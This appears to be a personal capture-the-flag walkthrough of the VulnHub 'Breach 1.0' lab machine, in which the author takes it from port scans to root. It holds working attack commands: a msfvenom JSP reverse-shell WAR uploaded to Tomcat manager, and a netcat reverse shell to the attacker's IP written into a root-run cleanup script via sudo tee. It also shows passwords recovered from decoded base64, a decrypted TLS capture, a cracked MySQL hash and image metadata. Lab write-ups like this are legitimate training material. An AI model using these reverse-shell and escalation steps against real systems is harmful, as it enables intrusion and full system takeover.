@@ -1,0 +1,526 @@
+First starting of by pinging Device
+ping 192.168.110.140
+It's alive:
+
+
+-------------------------------------
+
+Checking for open ports
+Normal scan -> nmap 192.168.110.140 
+		Shows all ports open (Probablly Due to IDS)
+		
+X-mas scan ->  nmap -sX 192.168.110.140 -p-                           
+
+    STATE         SERVICE
+80/tcp   open|filtered http
+4444/tcp open|filtered krb524
+8443/tcp open|filtered https-alt
+MAC Address: 00:0C:29:20:A3:74 (VMware)
+
+We get 3 port open  80 , 4444 , 8443
+Checking for all open port using script scan
+
+ Script-scan -> nmap -sC -sV 192.168.110.140 -n -p 80,4444,8443
+ 
+ We get following 
+ PORT     STATE SERVICE        VERSION
+80/tcp   open  http           Apache httpd 2.4.7 ((Ubuntu))
+|_http-title: Welcome to Breach 1.0
+|_http-server-header: Apache/2.4.7 (Ubuntu)
+4444/tcp open  krb524?
+| fingerprint-strings: 
+|   NULL: 
+|_    mir0ha
+8443/tcp open  ssl/https-alt?
+|_ssl-date: 2024-07-08T13:00:01+00:00; +3h43m57s from scanner time.
+| ssl-cert: Subject: commonName=Unknown/organizationName=Unknown/stateOrProvinceName=Unknown/countryName=Unknown
+| Not valid before: 2016-05-20T17:51:07
+|_Not valid after:  2016-08-18T17:51:07
+script results:
+|_clock-skew: 3h43m56s
+
+------------------------
+
+Looking into website in port 80 we get
+a website with some guy sleeping around [hahaha]
+
+-----------------------------------------------------
+Useful info along the ways__
+
+Users -
+	Bill Lumbergh
+	Peter Gibbons (User id- pwd)
+	Bill -> Admin
+	Michael
+	bob@intech.com
+	
+File:- 	
+	192.168.110.140/.keystore  
+		
+	
+
+Clicking on photo leads to intech website with login portals
+
+Checkig onto source of webpage:
+We get some randomized word probably base64
+	Encoded text -> Y0dkcFltSnZibk02WkdGdGJtbDBabVZsYkNSbmIyOWtkRzlpWldGbllXNW5KSFJo
+	
+	To decode: echo Y0dkcFltSnZibk02WkdGdGJtbDBabVZsYkNSbmIyOWtkRzlpWldGbllXNW5KSFJo | base 64 -d  [repeat it twice]
+
+	first dec text-> cGdpYmJvbnM6ZGFtbml0ZmVlbCRnb29kdG9iZWFnYW5nJHRh
+	
+again decode it
+	Base64 Decoded text ->
+	pgibbons:damnitfeel$goodtobeagang$ta
+[Probably some login password ]
+
+We got login password let login into employee portal
+Using id pwd we sucessfully loggedin into website
+
+We have some private messages availabe. Let's see if we can find any clue
+
+Now we have a keystore file in our hands
+
+
+I look everyplace for cluee
+i searched for members while entering disply name and email then we get redirected profile of user with corresponding id.
+	Sucessful search 
+	-Michael
+	-peter
+
+
+There is also advanced search feature available which gives us ability to search content more easilt inside website [Advanced Search]
+
+	Searching for  Michael we get
+	Old post about securing device properly
+	
+	For peter we get pcap file in   http://192.168.110.140/impresscms/_SSL_test_phase1.pcap 
+	
+	password -> tomcat for alias storepassword and keypassword
+	
+----------------------------------------------------
+
+Now lets getinto keystore. IDK what keystore was. Quick lookup into google 
+a lil bit of hint for tool called keytool
+
+Man keytool 
+and read the manuals and find which is useful for you : ) 
+
+Decrypting crt from keystore
+keytool -exportcert -keystore keystore -alias tomcat -file mycert.crt
+tried to use crt to decrypt tls but unable to do so 
+
+Need to convert it to pkcs12
+keytool -importkeystore -srckeystore keystore -destkeystore breach.p12 -srcstoretype JKS -deststoretype PKCS12
+
+
+Boom converted
+
+
+Use it in wireshark preferrence -> tls -> add IP , port , protocol and key.
+then follow tls stream
+
+-------------------------------------
+From TLS stream we get followings:
+
+There is a website on 
+GET /_M@nag3Me/html HTTP/1.1
+Host: 192.168.110.140:8443
+Server: Apache-Coyote/1.1
+ username="tomcat" password="s3cret" roles="manager-gui"/&gt -> default Creds
+ 
+ 
+ 
+ Authorization: Basic dG9tY2F0OlR0XDVEOEYoIyEqdT1HKTRtN3pC
+Base64 -> encoded 
+	Base64 decoded -> tomcat:Tt\5D8F(#!*u=G)4m7zB
+
+Probably some Creds for something useful
+
+Some crunchy cookie:
+Set-Cookie: JSESSIONID=A44E25D2104A4502C9AF9F07D80BBBEC; Path=/cmd; Secure
+
+
+------------------------------------------------------
+
+there is a page oon 192.168.110.140:8443 let's try to get there.
+
+usually we aren't able to access it 
+we get prompted with 	
+	The connection was reset
+	
+https://192.168.110.140:8443/_M@nag3Me/html
+if we try this addres then we get secre conn failed so to overcome this 
+
+So i tried it from burpsuite 
+but this time response was diff
+so i searched 
+	burpsuite error no response recieved from host ssl
+	on google
+	
+I found something intresting on 
+https://labs.nettitude.com/tutorials/how-to-fix-burp-suite-ssltls-connection-problems/
+
+then i looked out on client certificate on zap and burpsuite. Both provieds us abaility to use out certificate.
+I just loaded them up and acessed website again. Boom we're asked for id password for tomcat-manager-gui.
+We already have it so we just use it. BOOM we're in..
+
+We are in and it's a tomcat web app manger [obviously]
+
+Tomcat Version		JVM Version	JVM Vendor		OS Name	 	OS Version	OS Architecture
+Apache Tomcat/6.0.39	1.7.0_101-b00	Oracle Corporation	Linux	    4.2.0-27-generic	  amd64
+
+Looout for exploit for tomcat in searchsploit
+But didn't find any
+
+we could add file into website so we could generate our exploit and upload it there.
+
+We can use msfvenom to generate a payload 
+Tomcat uses jsp so we're using payload as java/jsp_shell_reverse_tcp
+
+msfvenom -p java/jsp_shell_reverse_tcp -LHOST=192.168.110.10 -LPORT=1000 -f war > file.war
+or
+msfvenom -p java/jsp_shell_reverse_tcp -e x86/shikata_ga_nai LHOST=192.168.110.10 LPORT=1000 -f war -o  encfile.war
+
+for encoed version
+now we just gotta upload it and after we upload it from path click on your uploaded file then book you got reverse shell
+ 
+ But make sure you're listening on your designated port
+ nc -nvlp port_num
+ 
+ It does'nt give interactive shell. 
+so we can use 
+python -c 'import pty; pty.spawn("/bin/bash")';
+boom now we have interactive shell
+
+
+
+
+Now for priviledge escalation  I used script
+https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh
+downloaded into my os and then used http.server to transfer file
+
+python -m http.server 8000 
+
+
+./scrpt
+
+
+From script we can get useful informations: 
+Most intresting info is:
+--------------------------------------------
+
+[-] Sudo version:
+Sudo version 1.8.9p5
+
+
+[-] MYSQL version:
+mysql  Ver 14.14 Distrib 5.5.49, for debian-linux-gnu (x86_64) using readline 6.3
+
+
+[+] We can connect to the local MYSQL service as 'root' and without a password!
+
+
+---------------------------------------------------------------------------
+
+so lets try loggin into mysql if we can get something intresting without pass
+
+mysql -u root -> to login as root
+
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 60
+Server version: 5.5.49-0ubuntu0.14.04.1 (Ubuntu)
+
+we're in- : )
+
+Tried looking into databases
+Got::
+
+| Database           |
++--------------------+
+| information_schema |
+| impresscms         |
+| mysql              |
+| performance_schema |
++--------------------+
+
+
+Looked into impresscms to fnd anything useful
+	Multiple tables
+	It was intresting -> iaed7929d_users
+	
+So i looked into it 
+	select * from iaed7929d_users
+
+|   1 |      | ImpressCMS Admin | admin@breach.local | http://192.168.110.140/impresscms/ | blank.gif   |   1464111137 |          |           |          |              0 |        |          |          |           | $23$5000$9TVS9C3x1yQDwyilDCHVs9ajuPNmIYrJyguldiNjvXqEkGjml5BtoRBlP3uZYgobh-ddfa97e337454d45fa2e58f426cae22ae7b93ff095c65c0367de21d3bc40a48dde54baee3afcf57a13d8b18a133665928b834f024c4a1a5aa4a4bed9c4416ddf |     0 |         0 |    7 | 5     | iTheme |             0.0 | 1464111137 | thread |      0 |             1 |           0 |          |     |              |           0 | english  |        |      |            0 |            0 |        1 | admin      |
+
+
+	
+Got username -> admin@breach.local 
+
+pwd enc -> $23$5000$9TVS9C3x1yQDwyilDCHVs9ajuPNmIYrJyguldiNjvXqEkGjml5BtoRBlP3uZYgobh-ddfa97e337454d45fa2e58f426cae22ae7b93ff095c65c0367de21d3bc40a48dde54baee3afcf57a13d8b18a133665928b834f024c4a1a5aa4a4bed9c4416ddf 
+
+
+Another user tables
+
+| uid | name | uname            | email                      | url                                | user_avatar | user_regdate | user_icq | user_from | user_sig | user_viewemail | actkey | user_aim | user_yim | user_msnm | pass                                                                                                                                                                                                        | posts | attachsig | rank | level | theme  | timezone_offset | last_login | umode  | uorder | notify_method | notify_mode | user_occ | bio | user_intrest | user_mailok | language | openid | salt | user_viewoid | pass_expired | enc_type | login_name |
+
+
+|   1 |      | ImpressCMS Admin | admin@breach.local         | http://192.168.110.140/impresscms/ | blank.gif   |   1464112910 |          |           |          |              0 |        |          |          |           | $23$5000$S4mancatNXCgGKpitGa5dTpN0uSo0iSIMPl3X5WdVXSEe8LILqDynHRa3R2OE5pPe-1c70c0c66700b42c4d1f2ec15638b6f5e0bbcbc03c50298ad79f765a33901709d825c9dbb98e703ea71af4bb826469fc0df5eb68e66e4192bf1651c6f06c060c |     0 |         0 |    7 | 5     | iTheme |             0.0 | 1465853545 | thread |      0 |             1 |           0 |          |     |              |           0 | english  |        |      |            0 |            0 |        1 | admin      |
+|   2 |      | Peter Gibbons    | peter.gibbons@initech.com  |                                    | blank.gif   |   1465044268 |          |           |          |              0 |        |          |          |           | $23$5000$eemraVuhMjb0muJ8eKaIfAjJuOQorYcJ3HT0TQWVZ3XIR34Suws6rYN6uSQsQOU-5d3e3c6d93b361ca051900d8cfaecbf13c0b96fa76f525683f3a54386e04c4a68594359d15e2599f718af54fcad9a1e85d438e84da1c5af51f1fc3e185ba68a0   |     0 |         0 |    0 | 1     |        |             0.0 | 1720520109 | nest   |      0 |             1 |           0 |          |     |              |           1 |          |        |      |            0 |            0 |        1 | pgibbons   |
+|   3 |      | Michael Bolton   | michael.bolton@initech.com |                                    | blank.gif   |   1465072166 |          |           |          |              0 |        |          |          |           | $23$5000$zk0tDm60SfN2vX9CJ3WuCxT3JoiwOmj99VwU3ZfuYwmKSuzhOuSDCLeedS7yhvC2-cac27699650c034aa4114fe1df04cc14e70a7dd6812a5af482e3c73f00b31595aa332242a0b67b0f58df485186d6c8176cafe1365f55097adcf15b307060d3f0  |     0 |         0 |    0 | 1     |        |             0.0 | 1465240932 | nest   |      0 |             1 |           0 |          |     |              |           1 |          |        |      |            0 |            0 |        1 | mbolton    |
+
+		full name		email 				login_name
+User  -> Peter Gibbons		 peter.gibbons@initech.com 		pgibbons
+pass -> $23$5000$eemraVuhMjb0muJ8eKaIfAjJuOQorYcJ3HT0TQWVZ3XIR34Suws6rYN6uSQsQOU-5d3e3c6d93b361ca051900d8cfaecbf13c0b96fa76f525683f3a54386e04c4a68594359d15e2599f718af54fcad9a1e85d438e84da1c5af51f1fc3e185ba68a0 
+
+User  ->Michael Bolton		michael.bolton@initech.com 		mbolton
+pass -> $23$5000$zk0tDm60SfN2vX9CJ3WuCxT3JoiwOmj99VwU3ZfuYwmKSuzhOuSDCLeedS7yhvC2-cac27699650c034aa4114fe1df04cc14e70a7dd6812a5af482e3c73f00b31595aa332242a0b67b0f58df485186d6c8176cafe1365f55097adcf15b307060d3f0 
+
+
+User  -> ImpressCMS Admin 	admin@breach.local 			admin
+pass -> $23$5000$S4mancatNXCgGKpitGa5dTpN0uSo0iSIMPl3X5WdVXSEe8LILqDynHRa3R2OE5pPe-1c70c0c66700b42c4d1f2ec15638b6f5e0bbcbc03c50298ad79f765a33901709d825c9dbb98e703ea71af4bb826469fc0df5eb68e66e4192bf1651c6f06c060c 
+
+Now let's look into db database
+looking into db -> It is empty
+
+if we look into user database 
+we get following: 
+
+| Host      | User             | Password                                  | Select_priv | Insert_priv | Update_priv | Delete_priv | Create_priv | Drop_priv | Reload_priv | Shutdown_priv | Process_priv | File_priv | Grant_priv | References_priv | Index_priv | Alter_priv | Show_db_priv | Super_priv | Create_tmp_table_priv | Lock_tables_priv | Execute_priv | Repl_slave_priv | Repl_client_priv | Create_view_priv | Show_view_priv | Create_routine_priv | Alter_routine_priv | Create_user_priv | Event_priv | Trigger_priv | Create_tablespace_priv | ssl_type | ssl_cipher | x509_issuer | x509_subject | max_questions | max_updates | max_connections | max_user_connections | plugin | authentication_string |
++-----------+------------------+-------------------------------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+--------+-----------------------+
+| localhost | root             |                                           | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      |          |            |             |              |             0 |           0 |               0 |                    0 |        |                       |
+|           | milton           | 6450d89bd3aff1d893b85d3ad65d2ec2          | N           | N           | N           | N           | N           | N         | N           | N             | N            | N         | N          | N               | N          | N          | N            | N          | N                     | N                | N            | N               | N                | N                | N              | N                   | N                  | N                | N          | N            | N                      |          |            |             |              |             0 |           0 |               0 |                    0 |        | NULL                  |
+| 127.0.0.1 | root             |                                           | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      |          |            |             |              |             0 |           0 |               0 |                    0 |        |                       |
+| ::1       | root             |                                           | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      |          |            |             |              |             0 |           0 |               0 |                    0 |        |                       |
+| localhost | debian-sys-maint | *A9523939F1B2F3E72A4306C34F225ACF09590878 | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      |          |            |             |              |             0 |           0 |               0 |                    0 |        | NULL                  |
+
+
+First look and boom Wuttttt... what is this hahaha..>...>..>
+
+
+Mysql {so mysql user-pwd}
+We have User and password here too:
+
+host 			User 			Password 		
+
+localhost 		root 			--
+			milton			6450d89bd3aff1d893b85d3ad65d2ec2
+127.0.0.1		root		
+::1			root			
+localhost 		debian-sys-maint 	*A9523939F1B2F3E72A4306C34F225ACF09590878 
+
+
+milton password  cracked  using Crackstation
+6450d89bd3aff1d893b85d3ad65d2ec2 -> thelaststraw
+milton:thelaststraw
+
+
+So trying to switch user in tomcat 
+su militon 
+pwd
+boom we're logged in as milton
+
+
+looked at home dir 
+some_script.sh
+
+cat to look into it 
+got this word_art
+
+----------------------------------------------------------------------------------------------------------------
+
+ _____ _                   _                   _   _     _               _                   
+|_   _| |                 ( )                 | | | |   (_)             | |                  
+  | | | |__   ___ _ __ ___|/ ___   _ __   ___ | |_| |__  _ _ __   __ _  | |__   ___ _ __ ___ 
+  | | | '_ \ / _ \ '__/ _ \ / __| | '_ \ / _ \| __| '_ \| | '_ \ / _` | | '_ \ / _ \ '__/ _ \
+  | | | | | |  __/ | |  __/ \__ \ | | | | (_) | |_| | | | | | | | (_| | | | | |  __/ | |  __/
+  \_/ |_| |_|\___|_|  \___| |___/ |_| |_|\___/ \__|_| |_|_|_| |_|\__, | |_| |_|\___|_|  \___|
+                                                                  __/ |                      
+                                                                 |___/                       
+----------------------------------------------------------------------------------------------------------------
+
+User-acc in passwd
+root:x:0:0:root:/root:/bin/bash
+milton:x:1000:1000:Milton_Waddams,,,:/home/milton:/bin/bash
+blumbergh:x:1001:1001:Bill Lumbergh,,,:/home/blumbergh:/bin/bash
+
+ 
+bash_hisytory in milton 
+cat .bash_history
+cd ..
+ls
+su milton
+cd milton
+cat .bash_history
+clear
+su root
+cat .bash_history
+ls -lah
+cat .bash_history
+su blumbergh 
+sudo nano
+sudo -i
+su root
+sudo nano
+logoff
+logout
+cd /
+su root
+logout
+exit
+sudo nano
+visudo
+clear
+poweroff
+su root
+
+
+[-] Can we read/write sensitive files:
+-rw-r--r-- 1 root root 1363 Jun  7  2016 /etc/passwd
+-rw-r--r-- 1 root root 759 Jun  6  2016 /etc/group
+-rw-r--r-- 1 root root 665 Feb 19  2014 /etc/profile
+-rw-r----- 1 root shadow 1029 Jun  6  2016 /etc/shadow
+
+
+
+--Helpful--- using  https://gtfobins.github.io/#moun
+[-] SUID files:
+-rwsr-xr-x 1 root root 36936 Jan 26  2016 /bin/su
+-rwsr-xr-x 1 root root 30800 May 15  2015 /bin/fusermount
+-rwsr-xr-x 1 root root 69120 Sep  2  2015 /bin/umount
+-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
+-rwsr-xr-x 1 root root 94792 Sep  2  2015 /bin/mount
+-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
+-rwsr-xr-x 1 root root 75256 Oct 21  2013 /usr/bin/mtr
+-rwsr-xr-x 1 root root 46424 Jan 26  2016 /usr/bin/chfn
+-rwsr-xr-x 1 root root 36592 Jan 26  2016 /usr/bin/newgrp
+-rwsr-xr-x 1 root root 155008 Aug 27  2015 /usr/bin/sudo
+-rwsr-xr-x 1 root root 23104 May  7  2014 /usr/bin/traceroute6.iputils
+-rwsr-sr-x 1 daemon daemon 51464 Oct 21  2013 /usr/bin/at
+-rwsr-xr-x 1 root root 41336 Jan 26  2016 /usr/bin/chsh
+-rwsr-xr-x 1 root root 72280 Jan 26  2016 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root 47032 Jan 26  2016 /usr/bin/passwd
+-rwsr-xr-x 1 root root 23304 Nov 24  2015 /usr/bin/pkexec
+-rwsr-xr-x 1 root root 14776 Nov 24  2015 /usr/lib/policykit-1/polkit-agent-helper-1
+-rwsr-xr-x 1 root root 440416 May  5  2016 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-- 1 root messagebus 310800 Nov 25  2014 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 10240 Feb 25  2014 /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-x 1 root root 10528 Jun 11  2012 /usr/lib/authbind/helper
+-rwsr-sr-x 1 libuuid libuuid 18904 Sep  2  2015 /usr/sbin/uuidd
+-rwsr-xr-- 1 root dip 347296 Apr 21  2015 /usr/sbin/pppd
+
+
+[-] SGID files:
+-rwxr-sr-x 1 root shadow 35536 Mar 16  2016 /sbin/unix_chkpwd
+-rwxr-sr-x 1 root tty 14688 Jun  4  2013 /usr/bin/bsd-write
+-rwxr-sr-x 1 root crontab 35984 Feb  9  2013 /usr/bin/crontab
+-rwxr-sr-x 1 root tty 19024 Sep  2  2015 /usr/bin/wall
+-rwsr-sr-x 1 daemon daemon 51464 Oct 21  2013 /usr/bin/at
+-rwxr-sr-x 1 root shadow 55000 Jan 26  2016 /usr/bin/chage
+-rwxr-sr-x 1 root ssh 284784 May  5  2016 /usr/bin/ssh-agent
+-rwxr-sr-x 1 root utmp 421768 Nov  7  2013 /usr/bin/screen
+-rwxr-sr-x 1 root mail 14856 Dec  6  2013 /usr/bin/dotlockfile
+-rwxr-sr-x 3 root mail 14592 Dec  3  2012 /usr/bin/mail-touchlock
+-rwxr-sr-x 1 root shadow 23360 Jan 26  2016 /usr/bin/expiry
+-rwxr-sr-x 3 root mail 14592 Dec  3  2012 /usr/bin/mail-unlock
+-rwxr-sr-x 3 root mail 14592 Dec  3  2012 /usr/bin/mail-lock
+-rwxr-sr-x 1 root mlocate 39520 Jun 20  2013 /usr/bin/mlocate
+-rwsr-sr-x 1 libuuid libuuid 18904 Sep  2  2015 /usr/sbin/uuidd
+
+
+
+
+
+
+File Name                       : bill.png
+Directory                       : .
+File Size                       : 323 kB
+File Modification Date/Time     : 2016:06:04 17:35:33-06:00
+File Access Date/Time           : 2024:07:10 01:11:34-06:00
+File Inode Change Date/Time     : 2024:07:10 01:11:34-06:00
+File Permissions                : -rw-r--r--
+File Type                       : PNG
+File Type Extension             : png
+MIME Type                       : image/png
+Image Width                     : 610
+Image Height                    : 327
+Bit Depth                       : 8
+Color Type                      : RGB with Alpha
+Compression                     : Deflate/Inflate
+Filter                          : Adaptive
+Interlace                       : Noninterlaced
+Warning                         : [minor] Text/EXIF chunk(s) found after PNG IDAT (may be ignored by some readers)
+Comment                         : coffeestains
+Image Size                      : 610x327
+Megapixels                      : 0.199
+                                              
+                                              
+                                              
+now we have a suspicious looking comment on picture which could be password for user blumbergh
+
+so if we try to login 
+su blumbergh:         coffeestains
+we get access
+
+if we look at sudo -l
+we can see a script and tee command which allow us to input data as root.
+
+so we can just do            
+                      
+echo " nc -nv 192.168.110.10 8800 -e /bin/bash" | sudo tee /usr/share/cleanup/tidyup.sh 
+                                              
+nc -nvlp 8800 
+listening on [any] 8800 ...
+
+listening on host our device:
+
+after maybe 2 or 3 min we get response
+
+connect to [192.168.110.10] from (UNKNOWN) [192.168.110.140] 36904
+ls
+flair.jpg
+shoami
+whoami
+root
+
+we are logged in as root and  there is a hidden file flag.txt. 
+Boom cat .flag.txt
+We sucessfully rooted the machine.
+
+pwd
+/root
+ls
+flair.jpg
+ls -alt
+total 60
+-rw-------  1 root root   115 Jun 12  2016 .bash_history
+drwx------  4 root root  4096 Jun 12  2016 .
+-rw-r--r--  1 root root   840 Jun 11  2016 .flag.txt
+drwx------  2 root root  4096 Jun  6  2016 .cache
+drwxr-xr-x  2 root root  4096 Jun  5  2016 .rpmdb
+-rw-r--r--  1 root root    66 Jun  4  2016 .selected_editor
+-rw-r--r--  1 root root 23792 Jun  4  2016 flair.jpg
+drwxr-xr-x 22 root root  4096 Jun  4  2016 ..
+-rw-r--r--  1 root root  3106 Feb 19  2014 .bashrc
+-rw-r--r--  1 root root   140 Feb 19  2014 .profile
+cat .flag.txt
+-----------------------------------------------------------------------------------
+
+______                     _     __   _____      _____ _          _____          _ 
+| ___ \                   | |   /  | |  _  |    |_   _| |        |  ___|        | |
+| |_/ /_ __ ___  __ _  ___| |__ `| | | |/' |______| | | |__   ___| |__ _ __   __| |
+| ___ \ '__/ _ \/ _` |/ __| '_ \ | | |  /| |______| | | '_ \ / _ \  __| '_ \ / _` |
+| |_/ / | |  __/ (_| | (__| | | || |_\ |_/ /      | | | | | |  __/ |__| | | | (_| |
+\____/|_|  \___|\__,_|\___|_| |_\___(_)___/       \_/ |_| |_|\___\____/_| |_|\__,_|
+
+
+-----------------------------------------------------------------------------------
+Congrats on reaching the end and thanks for trying out my first #vulnhub boot2root!
+
+Shout-out to knightmare, and rastamouse for testing and g0tmi1k for hosting. 
+
+----------------------------------------------------------------------------------
+
+
+         
